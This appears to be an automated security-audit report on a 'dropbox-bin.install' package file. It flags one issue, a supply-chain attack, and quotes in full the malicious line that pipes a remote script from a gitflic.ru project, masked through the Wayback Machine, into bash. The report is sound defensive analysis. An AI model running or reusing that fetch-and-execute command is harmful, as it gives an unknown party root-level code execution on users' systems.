# Issues (1 total)

## dropbox-bin.install

Status: UNSAFE

Summary: Arbitrary remote code execution via curl | bash

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

The `dropbox-bin.install` file contains a malicious command in the form of `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)`. This executes a shell script downloaded from an external source via process substitution directly into `bash`, without any integrity checks or verification.

The script is fetched from `gitflic.ru`, hosted under a user-controlled project named "hellscripter", and delivered through the Wayback Machine (`web.archive.org`), which is being misused to mask the origin. This is a known obfuscation technique used in supply chain attacks to bypass detection. The content is executed with the privileges of the package manager (typically root), allowing arbitrary code execution, potential backdoor installation, data exfiltration, or system compromise.

This is not standard packaging behavior. The use of `curl | bash` with process substitution and a non-upstream, suspicious remote URL constitutes a clear supply-chain attack.
